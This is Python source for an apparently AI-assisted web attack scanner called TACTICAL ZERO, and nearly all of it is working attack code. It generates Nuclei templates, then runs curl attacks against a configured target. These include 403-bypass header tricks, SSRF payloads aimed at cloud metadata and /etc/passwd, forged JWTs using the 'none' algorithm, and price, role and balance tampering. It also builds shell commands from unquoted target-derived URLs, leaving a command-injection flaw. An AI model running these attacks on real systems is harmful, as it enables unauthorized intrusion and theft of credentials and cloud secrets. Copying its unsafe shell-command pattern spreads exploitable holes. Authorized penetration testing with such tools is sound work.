"""
Dynamic Scanning Engine for TACTICAL ZERO
Adaptive, AI-augmented scanning with custom Nuclei templates,
specialized scripts, and non-linear testing patterns.
"""
import json, os, re, subprocess, shlex, tempfile
from typing import Dict, List, Optional, Any
from pathlib import Path


class DynamicScanner:
    """
    Intelligent scanning engine that adapts based on target profile,
generates custom templates, and executes creative testing patterns.
    """

    def __init__(self, config, workspace, ai_brain=None):
        self.config = config
        self.workspace = workspace
        self.ai = ai_brain
        self.templates_dir = Path(workspace.root) / "nuclei" / "custom_templates"
        self.templates_dir.mkdir(parents=True, exist_ok=True)
        self._scan_results: List[Dict] = []
        self._custom_templates_generated: List[str] = []

    def _run(self, cmd: str, timeout: int = 300, silent: bool = True) -> str:
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return (r.stdout or "").strip()
        except subprocess.TimeoutExpired:
            return ""
        except Exception as e:
            return f"[ERROR: {e}]"

    def tool_exists(self, tool: str) -> bool:
        return subprocess.run(f"which {shlex.quote(tool)}", shell=True, capture_output=True).returncode == 0

    # ═══════════════════════════════════════════════════════════
    # NUCLEI TEMPLATE MANAGEMENT
    # ═══════════════════════════════════════════════════════════

    def generate_custom_templates(self, recon_data: Dict[str, Any]):
        """Generate AI-powered custom Nuclei templates based on recon."""
        if not self.ai:
            return

        generated = []
        # Template 1: Technology-specific exposure based on detected stack
        tech_stack = recon_data.get("tech_stack", [])
        for tech in tech_stack:
            if tech.lower() in ["grafana", "kibana", "jenkins", "prometheus", "swagger", "actuator"]:
                template = self._generate_exposure_template(tech)
                if template:
                    generated.append(template)

        # Template 2: API endpoint pattern detection
        api_patterns = recon_data.get("api_patterns", [])
        for pattern in api_patterns:
            template = self._generate_api_template(pattern)
            if template:
                generated.append(template)

        # Template 3: AI-generated from anomalies
        anomalies = recon_data.get("anomalies", [])
        for anomaly in anomalies[:3]:
            template = self._generate_ai_template(anomaly)
            if template:
                generated.append(template)

        # Template 4: Logic flaw detection
        logic_indicators = recon_data.get("logic_indicators", [])
        for indicator in logic_indicators[:2]:
            template = self._generate_logic_template(indicator)
            if template:
                generated.append(template)

        # Template 5: Zero-day hints
        zero_day_hints = recon_data.get("zero_day_hints", [])
        for hint in zero_day_hints[:2]:
            template = self._generate_zero_day_template(hint)
            if template:
                generated.append(template)

        self._custom_templates_generated = generated
        self.workspace.write_json("nuclei/custom_templates_index.json", {
            "templates": generated,
            "count": len(generated),
        })
        return generated

    def _generate_exposure_template(self, tech: str) -> Optional[str]:
        tech_lower = tech.lower()
        templates = {
            "grafana": """id: grafana-exposed-panel
info:
  name: Grafana Exposed Panel
  author: tactical-zero
  severity: high
  description: Exposed Grafana instance detected
  tags: grafana,exposure,misconfig
http:
  - method: GET
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/api/org"
    matchers:
      - type: word
        words:
          - "Grafana"
          - "grafana-app"
        condition: or
""",
            "jenkins": """id: jenkins-exposed-panel
info:
  name: Jenkins Exposed Panel
  author: tactical-zero
  severity: critical
  tags: jenkins,exposure,rce
http:
  - method: GET
    path:
      - "{{BaseURL}}/login?from=%2F"
      - "{{BaseURL}}/script"
    matchers:
      - type: word
        words:
          - "Jenkins"
          - "Dashboard"
        condition: and
""",
            "kibana": """id: kibana-exposed-panel
info:
  name: Kibana Exposed Panel
  author: tactical-zero
  severity: high
  tags: kibana,elastic,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/app/kibana"
      - "{{BaseURL}}/api/status"
    matchers:
      - type: word
        words:
          - "kibana"
          - "cluster_uuid"
        condition: or
""",
            "swagger": """id: swagger-ui-exposed
info:
  name: Swagger UI Exposed
  author: tactical-zero
  severity: medium
  tags: swagger,api,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/swagger-ui.html"
      - "{{BaseURL}}/api/swagger-ui.html"
      - "{{BaseURL}}/swagger/index.html"
    matchers:
      - type: word
        words:
          - "swagger-ui"
          - "Swagger UI"
        condition: or
      - type: status
        status:
          - 200
""",
            "actuator": """id: spring-actuator-exposed
info:
  name: Spring Boot Actuator Exposed
  author: tactical-zero
  severity: high
  tags: spring,actuator,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/health"
      - "{{BaseURL}}/actuator/mappings"
    matchers:
      - type: word
        words:
          - '"activeProfiles"'
          - '"propertySources"'
          - '"status"'
        condition: or
      - type: status
        status:
          - 200
""",
            "prometheus": """id: prometheus-exposed
info:
  name: Prometheus Exposed
  author: tactical-zero
  severity: medium
  tags: prometheus,metrics,exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/metrics"
      - "{{BaseURL}}/prometheus"
    matchers:
      - type: word
        words:
          - "HELP"
          - "TYPE"
          - "go_gc_duration_seconds"
        condition: or
""",
        }
        if tech_lower not in templates:
            return None
        template_id = f"tactical-zero-{tech_lower}-exposed"
        template_path = self.templates_dir / f"{template_id}.yaml"
        template_path.write_text(templates[tech_lower])
        return str(template_path)

    def _generate_api_template(self, pattern: Dict) -> Optional[str]:
        path_pattern = pattern.get("path", "/api/v1/FUZZ")
        method = pattern.get("method", "GET")
        indicator = pattern.get("indicator", "")
        template_content = f"""id: api-endpoint-exposed-{pattern.get('id', 'unknown')}
info:
  name: API Endpoint Exposure
  author: tactical-zero
  severity: medium
  description: Exposed API endpoint pattern detected
  tags: api,exposure,automated
http:
  - method: {method}
    path:
      - "{{BaseURL}}{path_pattern}"
    matchers:
      - type: word
        words:
          - "{indicator}"
        condition: and
      - type: status
        status:
          - 200
          - 401
          - 403
"""
        template_path = self.templates_dir / f"api-{pattern.get('id', 'unknown')}.yaml"
        template_path.write_text(template_content)
        return str(template_path)

    def _generate_ai_template(self, anomaly: Dict) -> Optional[str]:
        if not self.ai:
            return None
        description = anomaly.get("description", "Anomalous behavior detected")
        evidence = anomaly.get("evidence", "")
        response = self.ai.generate_nuclei_template(
            description=description,
            target_type="web",
            pattern=anomaly.get("pattern", ""),
            evidence=evidence,
        )
        if "id:" in response and "info:" in response:
            tid = f"ai-generated-{anomaly.get('id', 'anomaly')}"
            template_path = self.templates_dir / f"{tid}.yaml"
            template_path.write_text(response)
            return str(template_path)
        return None

    def _generate_logic_template(self, indicator: Dict) -> Optional[str]:
        template_content = f"""id: logic-flaw-indicator-{indicator.get('id', 'unknown')}
info:
  name: Logic Flaw Indicator
  author: tactical-zero
  severity: medium
  description: Potential logic flaw in endpoint
  tags: logic,flaw,business-logic
http:
  - method: GET
    path:
      - "{{BaseURL}}{indicator.get('path', '/')}?{indicator.get('param', 'id')}=FUZZ"
    payloads:
      id_fuzz:
        - "1"
        - "-1"
        - "0"
        - "999999999"
        - "{{random_int}}"
    attack: clusterbomb
    matchers:
      - type: word
        words:
          - "{indicator.get('match_word', '')}"
        condition: and
"""
        template_path = self.templates_dir / f"logic-{indicator.get('id', 'unknown')}.yaml"
        template_path.write_text(template_content)
        return str(template_path)

    def _generate_zero_day_template(self, hint: Dict) -> Optional[str]:
        template_content = f"""id: zero-day-hint-{hint.get('id', 'unknown')}
info:
  name: Zero-Day Hint Detection
  author: tactical-zero
  severity: info
  description: Pattern matching zero-day indicator
  tags: zeroday,anomaly,informational
http:
  - method: GET
    path:
      - "{{BaseURL}}{hint.get('path', '/')}"
    matchers:
      - type: word
        words:
{chr(10).join(f'          - "{w}"' for w in hint.get('indicators', []))}
        condition: or
"""
        template_path = self.templates_dir / f"zeroday-{hint.get('id', 'unknown')}.yaml"
        template_path.write_text(template_content)
        return str(template_path)

    # ═══════════════════════════════════════════════════════════
    # NUCLEI EXECUTION
    # ═══════════════════════════════════════════════════════════

    def run_nuclei_comprehensive(self, targets_file: str) -> List[Dict]:
        if not self.tool_exists("nuclei"):
            return [{"error": "nuclei not installed"}]

        results = []
        vulns_dir = self.workspace.path("vulns")

        # Priority 1: Critical & High severity
        out_file = vulns_dir / "nuclei_critical_high.txt"
        self._run(
            f"nuclei -l {shlex.quote(targets_file)} -severity critical,high "
            f"-silent -o {shlex.quote(str(out_file))} -j > /dev/null 2>&1",
            timeout=600,
        )
        results.extend(self._parse_nuclei_jsonl(out_file.with_suffix(".json")))

        # Priority 2: Exposures
        out_file = vulns_dir / "nuclei_exposures.txt"
        self._run(
            f"nuclei -l {shlex.quote(targets_file)} "
            f"-t {shlex.quote(self.config.nuclei_templates_dir + '/http/exposures/')} "
            f"-silent -o {shlex.quote(str(out_file))} -j > /dev/null 2>&1",
            timeout=300,
        )
        results.extend(self._parse_nuclei_jsonl(out_file.with_suffix(".json")))

        # Priority 3: CVEs
        out_file = vulns_dir / "nuclei_cves.txt"
        self._run(
            f"nuclei -l {shlex.quote(targets_file)} "
            f"-t {shlex.quote(self.config.nuclei_templates_dir + '/http/cves/')} "
            f"-severity critical,high -silent -o {shlex.quote(str(out_file))} -j > /dev/null 2>&1",
            timeout=300,
        )
        results.extend(self._parse_nuclei_jsonl(out_file.with_suffix(".json")))

        # Priority 4: Technology detection
        out_file = vulns_dir / "nuclei_tech.txt"
        self._run(
            f"nuclei -l {shlex.quote(targets_file)} "
            f"-t {shlex.quote(self.config.nuclei_templates_dir + '/http/technologies/')} "
            f"-silent -o {shlex.quote(str(out_file))} -j > /dev/null 2>&1",
            timeout=120,
        )
        results.extend(self._parse_nuclei_jsonl(out_file.with_suffix(".json")))

        # Priority 5: Custom templates
        if self._custom_templates_generated:
            custom_dir = str(self.templates_dir)
            out_file = vulns_dir / "nuclei_custom.txt"
            self._run(
                f"nuclei -l {shlex.quote(targets_file)} -t {shlex.quote(custom_dir)} "
                f"-silent -o {shlex.quote(str(out_file))} -j > /dev/null 2>&1",
                timeout=300,
            )
            results.extend(self._parse_nuclei_jsonl(out_file.with_suffix(".json")))

        # Deduplicate
        seen = set()
        deduped = []
        for r in results:
            key = f"{r.get('template-id')}:{r.get('host')}:{r.get('matched-at', '')}"
            if key not in seen:
                seen.add(key)
                deduped.append(r)

        self._scan_results.extend(deduped)
        self.workspace.write_json("vulns/nuclei_all.json", deduped)
        return deduped

    def _parse_nuclei_jsonl(self, path) -> List[Dict]:
        results = []
        if not path.exists():
            return results
        for line in path.read_text().splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
                results.append({
                    "template-id": data.get("template-id", ""),
                    "template": data.get("template", ""),
                    "host": data.get("host", ""),
                    "matched-at": data.get("matched-at", ""),
                    "severity": data.get("info", {}).get("severity", "info"),
                    "name": data.get("info", {}).get("name", ""),
                    "tags": data.get("info", {}).get("tags", []),
                    "extracted-results": data.get("extracted-results", []),
                    "curl-command": data.get("curl-command", ""),
                })
            except json.JSONDecodeError:
                continue
        return results

    # ═══════════════════════════════════════════════════════════
    # SPECIALIZED TESTING PATTERNS
    # ═══════════════════════════════════════════════════════════

    def run_403_bypass_tests(self, forbidden_file: str) -> List[Dict]:
        """Execute creative 403 bypass techniques."""
        findings = []
        if not Path(forbidden_file).exists():
            return findings

        endpoints = Path(forbidden_file).read_text().splitlines()[:50]
        bypass_dir = self.workspace.path("vulns")

        bypasses = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Original-URL", None),  # Special handling
            ("X-Rewrite-URL", None),
            ("X-HTTP-Method-Override", "GET"),
        ]

        for endpoint in endpoints:
            endpoint = endpoint.strip()
            if not endpoint:
                continue
            for header, value in bypasses:
                if header in ("X-Original-URL", "X-Rewrite-URL"):
                    # Path override bypass
                    parsed = endpoint.replace("https://", "").replace("http://", "")
                    path = "/" + "/".join(parsed.split("/")[1:]) if "/" in parsed else "/"
                    cmd = f"curl -sk -o /dev/null -w '%{{http_code}}' -H '{header}: {path}' '{endpoint}/' 2>/dev/null"
                else:
                    cmd = f"curl -sk -o /dev/null -w '%{{http_code}}' -H '{header}: {value}' '{endpoint}' 2>/dev/null"
                code = self._run(cmd, timeout=10)
                if code and code != "403" and code.startswith(("2", "3")):
                    finding = {
                        "type": "403_bypass",
                        "endpoint": endpoint,
                        "header": header,
                        "value": value or path,
                        "bypass_code": code,
                        "severity": "medium",
                        "description": f"403 bypass achieved using {header} header",
                    }
                    findings.append(finding)
                    self.workspace.add_finding(finding)

        self.workspace.write_json("vulns/403_bypasses.json", findings)
        return findings

    def run_ssrf_tests(self, ssrf_candidates_file: str) -> List[Dict]:
        """Execute creative SSRF payload tests."""
        findings = []
        if not Path(ssrf_candidates_file).exists():
            return findings

        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80/",
            "http://127.0.0.1:8080/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "http://017700000001/",
            "file:///etc/passwd",
            "dict://localhost:11211/",
            "gopher://localhost:9000/",
        ]

        candidates = Path(ssrf_candidates_file).read_text().splitlines()[:30]
        for url in candidates:
            url = url.strip()
            if not url or "=" not in url:
                continue
            base = url.split("?")[0]
            params = url.split("?")[1] if "?" in url else ""
            for payload in ssrf_payloads[:5]:
                test_url = f"{base}?{params.split('&')[0].split('=')[0]}={payload}" if params else f"{url}?url={payload}"
                cmd = f"curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' '{test_url}' --max-time 10 2>/dev/null"
                resp = self._run(cmd, timeout=15)
                if resp:
                    code, size = resp.split(":") if ":" in resp else (resp, "0")
                    if code in ("200", "201") and int(size) > 100:
                        finding = {
                            "type": "ssrf_potential",
                            "url": test_url,
                            "payload": payload,
                            "response_code": code,
                            "response_size": size,
                            "severity": "high",
                        }
                        findings.append(finding)
                        self.workspace.add_finding(finding)

        self.workspace.write_json("vulns/ssrf_tests.json", findings)
        return findings

    def run_logic_flaw_tests(self, alive_hosts: List[str], api_endpoints: List[str]) -> List[Dict]:
        """Test for business logic vulnerabilities."""
        findings = []
        logic_tests = [
            {"name": "price_manipulation", "param": "price", "test_values": ["-1", "0", "0.01", "-0.01"]},
            {"name": "quantity_manipulation", "param": "qty", "test_values": ["-1", "0", "999999", "1.5"]},
            {"name": "role_escalation", "param": "role", "test_values": ["admin", "root", "superuser", "1"]},
            {"name": "negative_balance", "param": "amount", "test_values": ["-100", "-1", "0"]},
            {"name": "rate_limit_bypass", "param": "limit", "test_values": ["-1", "0", "9999999"]},
        ]

        for endpoint in api_endpoints[:20]:
            for test in logic_tests:
                for value in test["test_values"]:
                    cmd = (
                        f"curl -sk -X POST '{endpoint}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{{\"{test['param']}\": {json.dumps(value)}}}' "
                        f"-o /dev/null -w '%{{http_code}}' --max-time 10 2>/dev/null"
                    )
                    code = self._run(cmd, timeout=15)
                    if code == "200":
                        finding = {
                            "type": "logic_flaw",
                            "test": test["name"],
                            "endpoint": endpoint,
                            "payload": {test["param"]: value},
                            "severity": "medium",
                        }
                        findings.append(finding)
                        self.workspace.add_finding(finding)

        self.workspace.write_json("vulns/logic_tests.json", findings)
        return findings

    def run_advanced_jwt_tests(self, js_dir: str) -> List[Dict]:
        """Advanced JWT security testing."""
        findings = []
        jwt_patterns = []

        # Extract potential JWTs from JS files
        js_path = Path(js_dir)
        if js_path.exists():
            for f in js_path.glob("*.txt"):
                content = f.read_text()
                tokens = re.findall(r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*', content)
                jwt_patterns.extend(tokens)

        for token in list(set(jwt_patterns))[:10]:
            # Test "none" algorithm
            parts = token.split(".")
            if len(parts) == 3:
                none_token = f"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{parts[1]}."
                cmd = (
                    f"curl -sk -H 'Authorization: Bearer {none_token}' "
                    f"'{self.config.target}/api/user' -o /dev/null -w '%{{http_code}}' --max-time 10 2>/dev/null"
                )
                code = self._run(cmd, timeout=15)
                if code == "200":
                    finding = {
                        "type": "jwt_none_algorithm",
                        "token_sample": token[:50] + "...",
                        "severity": "critical",
                    }
                    findings.append(finding)
                    self.workspace.add_finding(finding)

        self.workspace.write_json("vulns/jwt_tests.json", findings)
        return findings

    def run_all_dynamic_scans(self, recon_data: Dict[str, Any]) -> List[Dict]:
        """Execute all dynamic scanning phases."""
        all_findings = []

        # Generate custom templates first
        self.generate_custom_templates(recon_data)

        # Determine scan targets: recon alive hosts + direct target URL
        alive_file = str(self.workspace.path("subs/alive_hosts.txt"))
        scan_targets = []
        if Path(alive_file).exists():
            scan_targets = [l.strip() for l in Path(alive_file).read_text(errors="ignore").splitlines() if l.strip()]
        # Always include the target URL directly
        if self.config.target not in scan_targets:
            scan_targets.insert(0, self.config.target)

        # Write targets to a temp file for nuclei -list
        targets_file = self.workspace.path("subs/dynamic_scan_targets.txt")
        targets_file.parent.mkdir(parents=True, exist_ok=True)
        targets_file.write_text("\n".join(scan_targets))
        all_findings.extend(self.run_nuclei_comprehensive(str(targets_file)))

        # 403 bypass: use forbidden file if available, otherwise test common paths on target
        forbidden_file = str(self.workspace.path("subs/forbidden_403.txt"))
        if Path(forbidden_file).exists() and Path(forbidden_file).stat().st_size > 0:
            all_findings.extend(self.run_403_bypass_tests(forbidden_file))
        else:
            all_findings.extend(self._run_403_bypass_direct())

        # SSRF: use recon file if available, otherwise test target directly
        ssrf_file = str(self.workspace.path("urls/ssrf.txt"))
        if Path(ssrf_file).exists() and Path(ssrf_file).stat().st_size > 0:
            all_findings.extend(self.run_ssrf_tests(ssrf_file))
        else:
            all_findings.extend(self._run_ssrf_direct())

        # Logic flaws: use API endpoints from recon or probe target
        api_file = str(self.workspace.path("urls/api.txt"))
        api_endpoints = []
        if Path(api_file).exists():
            api_endpoints = [l.strip() for l in Path(api_file).read_text(errors="ignore").splitlines() if l.strip()]
        if not api_endpoints:
            api_endpoints = [f"{self.config.target}/api", f"{self.config.target}/api/v1",
                             f"{self.config.target}/graphql", f"{self.config.target}/login"]
        if api_endpoints:
            all_findings.extend(self.run_logic_flaw_tests(scan_targets, api_endpoints))

        js_dir = str(self.workspace.path("js"))
        all_findings.extend(self.run_advanced_jwt_tests(js_dir))

        return all_findings

    def _run_403_bypass_direct(self) -> List[Dict]:
        """Test 403 bypass on common protected paths directly against the target."""
        findings = []
        test_paths = ["/admin", "/api", "/api/v1", "/internal", "/config", "/debug",
                       "/console", "/dashboard", "/panel", "/manage", "/root", "/secret"]
        bypass_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Original-URL", ""),
            ("X-Rewrite-URL", ""),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("Referer", f"{self.config.target}/"),
        ]
        for path in test_paths:
            base_cmd = f"curl -sk -o /dev/null -w '%{{http_code}}' '{self.config.target}{path}' --max-time 5 2>/dev/null"
            base_code = self._run(base_cmd, timeout=8)
            if base_code == "403":
                for hdr_name, hdr_val in bypass_headers:
                    val = hdr_val or path
                    cmd = f"curl -sk -o /dev/null -w '%{{http_code}}' -H '{hdr_name}: {val}' '{self.config.target}{path}' --max-time 5 2>/dev/null"
                    code = self._run(cmd, timeout=8)
                    if code and code != "403" and code != "000":
                        findings.append({
                            "type": "403_bypass",
                            "path": path,
                            "header": hdr_name,
                            "original_code": base_code,
                            "bypass_code": code,
                            "severity": "high" if code == "200" else "medium",
                            "url": f"{self.config.target}{path}",
                        })
        return findings

    def _run_ssrf_direct(self) -> List[Dict]:
        """Test SSRF on common parameters directly against the target."""
        findings = []
        test_params = ["url", "redirect", "next", "src", "dest", "target", "uri", "path", "callback", "proxy"]
        payloads = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/",
                     "http://[::1]", "http://0.0.0.0", "http://127.0.0.1:22"]
        test_paths = ["/", "/fetch", "/proxy", "/redirect", "/api/fetch", "/api/proxy", "/load", "/preview"]
        for path in test_paths:
            for param in test_params:
                for payload in payloads[:3]:
                    url = f"{self.config.target}{path}?{param}={payload}"
                    cmd = f"curl -sk -o /dev/null -w '%{{http_code}}|%{{size_download}}' '{url}' --max-time 5 2>/dev/null"
                    result = self._run(cmd, timeout=8)
                    if "|" in result:
                        code, size = result.split("|", 1)
                        if code == "200" and int(size or 0) > 0:
                            findings.append({
                                "type": "ssrf_potential",
                                "path": path,
                                "param": param,
                                "payload": payload,
                                "code": code,
                                "size": size,
                                "severity": "high",
                                "url": url,
                            })
        return findings
